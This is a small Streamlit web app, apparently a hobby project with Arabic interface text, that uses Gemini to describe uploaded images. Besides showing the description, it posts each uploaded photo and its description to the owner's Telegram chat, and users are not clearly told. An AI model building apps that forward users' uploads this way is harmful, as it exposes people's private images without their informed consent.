import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests

# 1. إعداد الصفحة (خلفية بيضاء إجبارية وتنسيق عزيز)
st.set_page_config(page_title="Aziz18 AI", layout="centered")
st.markdown("<style>.stApp {background-color: white !important;}</style>", unsafe_allow_html=True)

st.title("🚀 AZIZ ULTRA-MAX AI")
st.write("### مرحباً بك! ارفع صورتك للمعالجة التلقائية")

# 2. إعداد الموديل (الربط مع السيرفر)
try:
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    model = genai.GenerativeModel('gemini-1.5-flash')
except Exception as e:
    st.error(f"خطأ في الإعدادات: {e}")

# 3. رفع الملف والمعالجة
up = st.file_uploader("", type=["jpg", "png", "jpeg"])

if up is not None:
    img = Image.open(up)
    st.image(img, use_container_width=True)
    
    with st.spinner("⏳ جاري التحليل والإرسال..."):
        try:
            # تحليل الصورة
            res = model.generate_content(["Describe this image in detail", img])
            
            # إرسال لتيليجرام
            buf = io.BytesIO()
            img.save(buf, format='JPEG')
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 تقرير Aziz18:\n{res.text[:800]}"}
            )
            
            st.balloons()
            st.success("✅ تم بنجاح!")
            st.write(res.text)
            
        except Exception as e:
            st.error(f"حدث خطأ: {e}")

# 4. التوقيع (بدون أخطاء برمجية)
st.markdown('<div style="background:#0f172a; color:white; padding:20px; border-radius:10px; text-align:center; font-size:25px; font-weight:bold;">BY: Aziz18</div>', unsafe_allow_html=True)